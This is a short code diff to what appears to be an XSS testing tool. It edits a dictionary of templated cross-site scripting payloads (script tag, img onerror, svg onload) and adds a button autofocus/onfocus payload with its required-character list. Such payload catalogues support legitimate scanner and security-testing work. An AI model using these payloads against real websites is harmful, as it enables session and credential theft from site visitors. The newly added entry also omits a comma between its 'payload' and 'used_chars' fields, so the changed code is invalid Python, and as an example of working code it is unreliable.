@@ -21,7 +21,7 @@ BASE_PAYLOADS = {
     "INJECT_HTML": [
         {
             "payload": """<script>FUNCTION("ARGS")</script>""",
-            "used_chars": ['<', '>', '(', ')', '"', 'FUNCTION', 'ARGS']
+            "used_chars": ['<', '>', '(', ')', '"', '/', 'FUNCTION', 'ARGS']
         },
         {
             "payload": """<img src="x" onerror="FUNCTION('ARGS')">""",
@@ -30,6 +30,10 @@ BASE_PAYLOADS = {
         {
             "payload": """<svg onload="FUNCTION('ARGS')">""",
             "used_chars": ['<', '>', '(', ')', '"', "'", '=', 'FUNCTION', 'ARGS']
+        },
+        {
+            "payload": """<button autofocus onfocus=FUNCTION('ARGS')></button>"""
+            "used_chars": ['<', '>', '(', ')', '"', "'", '=', '/', 'FUNCTION', 'ARGS']
         }
     ],
     "ESCAPE_HTML": [
